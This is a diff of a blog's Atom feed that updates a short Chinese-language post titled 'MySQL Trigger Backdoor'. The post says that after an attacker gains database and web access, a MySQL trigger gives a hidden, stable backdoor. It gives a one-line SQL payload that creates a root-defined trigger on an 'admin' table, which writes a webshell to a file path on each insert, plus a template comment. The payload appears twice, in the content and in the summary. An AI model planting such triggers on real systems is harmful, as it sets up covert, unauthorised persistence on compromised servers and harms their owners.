@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://blog.cyrils.org/"/>
-  <updated>2016-05-01T20:23:08.000Z</updated>
+  <updated>2016-05-01T20:24:59.000Z</updated>
   <id>http://blog.cyrils.org/</id>
   
   <author>
@@ -20,15 +20,17 @@
     <link href="http://blog.cyrils.org/2016/05/02/MySQL-Trigger-Backdoor/"/>
     <id>http://blog.cyrils.org/2016/05/02/MySQL-Trigger-Backdoor/</id>
     <published>2016-05-01T20:17:58.000Z</published>
-    <updated>2016-05-01T20:23:08.000Z</updated>
+    <updated>2016-05-01T20:24:59.000Z</updated>
     
     <content type="html">&lt;h2 id=&quot;First-of-all&quot;&gt;&lt;a href=&quot;#First-of-all&quot; class=&quot;headerlink&quot; title=&quot;First of all&quot;&gt;&lt;/a&gt;First of all&lt;/h2&gt;&lt;p&gt;关于拿到一些数据库&amp;amp;web的权限之后，MySQL触发器可以做到比较隐蔽，稳定的后门效果.&lt;/p&gt;
 &lt;h3 id=&quot;Payload&quot;&gt;&lt;a href=&quot;#Payload&quot; class=&quot;headerlink&quot; title=&quot;Payload&quot;&gt;&lt;/a&gt;Payload&lt;/h3&gt;&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;create&lt;/span&gt; definer=&lt;span class=&quot;string&quot;&gt;`root@localhost`&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;trigger&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;`test`&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;before&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;insert&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;`admin`&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;row&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;shell&#39;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;into&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;outfile&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;path&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;//用户+触发器名+表+shell+路径&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
 </content>
     
     <summary type="html">
     
-      &lt;h2 id=&quot;First-of-all&quot;&gt;&lt;a href=&quot;#First-of-all&quot; class=&quot;headerlink&quot; title=&quot;First of all&quot;&gt;&lt;/a&gt;First of all&lt;/h2&gt;&lt;p&gt;关于拿到一些数据库&amp;amp;web的权限之后，MySQL触发
+      &lt;h2 id=&quot;First-of-all&quot;&gt;&lt;a href=&quot;#First-of-all&quot; class=&quot;headerlink&quot; title=&quot;First of all&quot;&gt;&lt;/a&gt;First of all&lt;/h2&gt;&lt;p&gt;关于拿到一些数据库&amp;amp;web的权限之后，MySQL触发器可以做到比较隐蔽，稳定的后门效果.&lt;/p&gt;
+&lt;h3 id=&quot;Payload&quot;&gt;&lt;a href=&quot;#Payload&quot; class=&quot;headerlink&quot; title=&quot;Payload&quot;&gt;&lt;/a&gt;Payload&lt;/h3&gt;&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;create&lt;/span&gt; definer=&lt;span class=&quot;string&quot;&gt;`root@localhost`&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;trigger&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;`test`&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;before&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;insert&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;`admin`&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;row&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;shell&#39;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;into&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;outfile&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;path&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;//用户+触发器名+表+shell+路径&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
     
     </summary>
     
